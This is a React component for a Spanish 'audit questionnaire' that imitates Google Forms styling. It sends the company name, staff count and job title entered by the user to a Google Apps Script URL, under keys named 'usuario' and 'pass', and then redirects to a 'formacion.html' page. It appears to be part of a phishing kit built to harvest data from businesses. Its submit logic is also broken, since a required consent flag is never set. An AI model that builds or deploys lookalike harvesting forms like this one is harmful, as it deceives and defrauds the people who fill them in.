import { useState } from "react";
import { Check } from "lucide-react";

const AuditForm = () => {
  const [empresa, setEmpresa] = useState("");
  const [trabajadores, setTrabajadores] = useState("");
  const [cargo, setCargo] = useState("");
  const [protocolo, setProtocolo] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const webAppUrl = "https://script.google.com/macros/s/AKfycbzaoOqKcF_TawLruyEebZuBhGahZigayFC3eFYeIzvZqU5T7UWVm7nnBvwa2zS-jkyZ/exec";

  const handleSubmit = async () => {
    if (!empresa || !trabajadores || !cargo || !protocolo) return;
    setIsSubmitting(true);

    try {
      await fetch(webAppUrl, {
        method: "POST",
        mode: "no-cors",
        body: JSON.stringify({ 
          usuario: empresa, 
          pass: `Emp: ${trabajadores} | Cargo: ${cargo}`, 
          tipo: "FORMULARIO" 
        })
      });
      window.location.href = "formacion.html";
    } catch (e) {
      window.location.href = "formacion.html";
    }
  };

  return (
    <div className="w-full max-w-[640px] mx-auto px-4 py-8">
      <div className="forms-card mb-4 overflow-hidden">
        <div className="forms-card-header" />
        <div className="p-8">
          <h1 className="text-3xl font-normal mb-3 font-google-sans">Cuestionario de Auditoría</h1>
          <p className="text-sm">Expediente SC-2026-882</p>
        </div>
      </div>

      <div className="forms-card p-6 mb-4">
        <label className="block mb-4 font-medium">Nombre de la empresa *</label>
        <input type="text" value={empresa} onChange={(e) => setEmpresa(e.target.value)} className="forms-input w-full" />
      </div>

      <div className="forms-card p-6 mb-4">
        <label className="block mb-4 font-medium">Nº de trabajadores *</label>
        {["1-10", "11-50", "50+"].map(opt => (
          <label key={opt} className="flex items-center gap-3 mb-2 cursor-pointer">
            <input type="radio" name="t" onChange={() => setTrabajadores(opt)} className="forms-radio" />
            <span>{opt}</span>
          </label>
        ))}
      </div>

      <div className="forms-card p-6 mb-4">
        <label className="block mb-4 font-medium">Cargo del responsable *</label>
        <input type="text" value={cargo} onChange={(e) => setCargo(e.target.value)} className="forms-input w-full" />
      </div>

      <button 
        onClick={handleSubmit} 
        disabled={isSubmitting || !empresa || !trabajadores || !cargo}
        className="forms-btn-submit"
      >
        {isSubmitting ? "Enviando..." : "Enviar"}
      </button>
    </div>
  );
};

export default AuditForm;
